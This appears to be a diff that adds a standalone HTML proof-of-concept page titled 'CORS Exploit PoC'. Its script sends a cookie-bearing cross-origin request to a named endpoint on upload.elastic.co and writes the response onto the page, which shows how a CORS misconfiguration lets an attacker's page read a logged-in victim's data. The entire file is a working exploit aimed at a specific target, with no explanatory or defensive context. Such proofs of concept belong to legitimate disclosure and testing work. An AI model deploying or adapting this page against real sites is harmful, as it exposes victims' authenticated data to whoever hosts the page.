@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>CORS Exploit PoC</h1>
+    <button id="exploit">Exploit</button>
+    <pre id="output"></pre>
+
+    <script>
+        document.getElementById('exploit').onclick = function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'http://upload.elastic.co/endpoint', true);
+            xhr.withCredentials = true; // This sends cookies with the request
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    document.getElementById('output').textContent = xhr.responseText;
+                }
+            };
+            xhr.send();
+        };
+    </script>
+</body>
+</html>
